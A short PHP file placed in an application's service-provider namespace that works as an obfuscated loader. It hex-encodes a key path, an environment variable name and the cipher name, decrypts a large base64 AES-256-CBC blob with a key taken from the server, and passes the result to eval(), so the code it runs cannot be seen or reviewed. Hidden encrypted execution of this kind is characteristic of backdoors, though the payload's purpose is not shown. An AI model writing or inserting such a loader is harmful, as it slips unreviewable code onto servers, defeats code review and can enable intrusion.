<?php
namespace App\Providers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('uo7k71qViGI4EGWj3EYB6w==');

$c=base64_decode(

'iMs+gLSq/1fVk5WMjnOOeBKHuJqvBq1RJEdNe8bWVmxF/5Zbsp3g5ETUXG7bGuxK0Dzy87qk1ixs' .
'xBtXLk/FlwvT0zA1zJ2YqouF5hP8ZwdCKL20MDbjQ2Q6DHSAq2cPNpJxAbcf2d9RBok3l5uy/p0A' .
'TPNTsdERCI4I9cQx5awl7ogMKkCSKzhb+p41tSn5+G3TRZcurNAo8wSel6MP5NRrTNxZoIYmddkx' .
'awDGoClxybZAs7qG6tiv3JF6A+xjAjxnbVK6gWNyEjGDpskdn1U8EQ05V1xsHEVNeJO0L6YR/rE9' .
'61bNg5SsUijiYWWDiBNHslrKf9XCniUSEiss1CLRU2odr/XVPPBxUUQH/in9wrobki/1pboMYnSQ' .
'Qwt2ICV2nSzY9fz6dMkDz26PNiJCPGc7VWqy/McX4G2CDiXGlwOHsNmOo1sEd5Ee7B32ilho8qq4' .
'w6D6INmXDL700RyQ1n/JNUoCajqu9qtNELFSvStO6IRpBx37DY95dZiVzDeM1zbB982TBa1a8pkC' .
'mKKGwHzizwdVyZwjsDmMwQuQJCbrSVyu7MoYT7mbZFsKuFlNWBEmWFlLq0fvp+w/Pus3QP0rfwrj' .
'auzaY7GZBeersNZNXvGgYKwj+9pXx4XfuHPC08mFtn8uXfxGIWWbWQUoOyd8kpc5QgACmU2c73VK' .
'rWvZjmOWOs5ioY7fSohGStDFlO+cfPurCPx6o1hP/M+rWZoUEz2Ah0K4qQXKBzfZSTpWKzUpHuDP' .
'wauHrdGQATof1V9JGjbt4UrTCT1UzGiiFP1gn4xJ1+5N0vI/11tB8idWXO9c76eg5nOnb4Z7uWCZ' .
'+prZqWu+0uVFIDaGoIKHMsR/L+HpaV2u7MjAJ7NZIQ1wuL5XMmwhkqfsJVnnUy0vA8PmSPIgFduX' .
'/asDqccqgEG0EgKXtcqJoyjVuYg8xLzazPE/6RPKSwC5h+LOUbKE5RvmBgQJfKYl6n4iBJRznHVx' .
'NTzPmRl062sr6jMpNnkeZyyjsL13bfoQ46RxBPQ2EndyYr2o/8jLTIjhH9cS50UyB0oanJl2x82I' .
'u2pYZIJDsqqeSzui/0ijlGEOkkdUCA55Ub6W8nyxre4DXjHVOM9ZNPrW7vbZWxwHFB0GuIMrnrIH' .
'QRN6DWS2HdrJfRZFuQQeqfJ/b1P8w5K2tJSAaeeoDsJ2n3A1C0UmXhgNMo8QIsu5w9hQFDtUBdsE' .
'52WQVNGkRJ5O/HIVmLq9xmSbzz0AJ9WzAooKSY1mRmXiIgqBuKQaOKPEhRQKFNDzJ6fHDs1LV3Oo' .
'Imw6xFA0bUp9k4vG2p/80JxmZfl8kSqW6f7vLHsRnueDEy/isXi+NBDRVgm6k3jkGCD9DsDnOLrG' .
'kXq+edmC+GZK++vDU0lLjoqxgiPu9fwm3uvng/9ODCUoMjwRQmSROwc+HBDL/wlKeXUbI+GrUb8c' .
'd7dKukPK/Jm+O1seXm0Cvq6YPeYASg85QlS/HeXgocQkopB2FImHuyHfeOVuNJhLo2rCe4/HqDYG' .
'nW6YrqggMSno1+/csR0ojDsbBRKdsKzkHBvcYijAtWbEWV9aVGO+52R5tWvzhPMWhZjgwVQMxJo6' .
'QflT4SyfVE5QFgjpwGYL33sr6o+lpPa6Mzn69zVIssAPfxW2xOXQK6+O7FjjPpfjGqth3MLsxWGn' .
'7NjJi3dCSCRZ7yeEgp2M1UFTD6PD5CeGCdht7bFB/Mx0QYdk0zlK2qkQJVHTE4QGDJy+dApJExVp' .
'nUzvr720ElHu4V0yDjrLiOvLp0ESW1uWgdTCXmZqJP2geuJ6A4R1Y2eFU6Oev5Z9yMHYpoR1Aodc' .
'suZ5WAD+4EQDSNZEFu37Jr4UNNwYBqvc'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

